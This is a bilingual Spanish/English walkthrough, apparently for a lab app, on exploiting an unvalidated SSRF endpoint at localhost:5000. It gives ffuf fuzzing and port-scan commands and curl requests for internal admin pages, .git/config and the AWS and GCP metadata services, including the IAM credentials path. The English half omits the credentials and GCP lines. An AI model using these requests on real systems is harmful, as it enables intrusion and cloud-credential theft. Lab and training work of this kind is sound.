Pasos de explotación

  1. El endpoint /ssrf?url=... realiza peticiones HTTP a cualquier URL sin validar ni filtrar.
  2. Descubre endpoints internos con ffuf apuntando al parámetro vulnerable:
# Fuzzing de rutas internas vía SSRF
ffuf -u "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302 -t 20

# Escaneo de puertos internos vía SSRF (observa diferencias en tiempo/error)
ffuf -u "http://localhost:5000/ssrf?url=http://127.0.0.1:FUZZ" \
  -w /usr/share/seclists/Fuzzing/ports.txt \
  -mc 200 -t 10
  1. Accede a recursos internos encontrados:
curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/api/users"
curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/admin"
curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/.git/config"
  1. En entornos cloud, accede al servicio de metadatos:
# AWS metadata
curl "http://localhost:5000/ssrf?url=http://169.254.169.254/latest/meta-data/"
curl "http://localhost:5000/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP metadata
curl "http://localhost:5000/ssrf?url=http://metadata.google.internal/computeMetadata/v1/"
  1. Con Burp Suite: intercepta la petición GET → Repeater → modifica el parámetro url → observa la respuesta del servidor.

Exploitation Steps

  1. The /ssrf?url=... endpoint makes HTTP requests to any URL without validation or filtering.
  2. Discover internal endpoints with ffuf targeting the vulnerable parameter:
# Fuzzing internal paths via SSRF
ffuf -u "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302 -t 20

# Internal port scan via SSRF (observe time/error differences)
ffuf -u "http://localhost:5000/ssrf?url=http://127.0.0.1:FUZZ" \
  -w /usr/share/seclists/Fuzzing/ports.txt \
  -mc 200 -t 10
  1. Access discovered internal resources:
curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/api/users"
curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/admin"
curl "http://localhost:5000/ssrf?url=http://127.0.0.1:5000/.git/config"
  1. In cloud environments, access the metadata service:
# AWS metadata
curl "http://localhost:5000/ssrf?url=http://169.254.169.254/latest/meta-data/"

# GCP metadata

  1. With Burp Suite: intercept the GET request → Repeater → modify the url parameter → observe the server response.
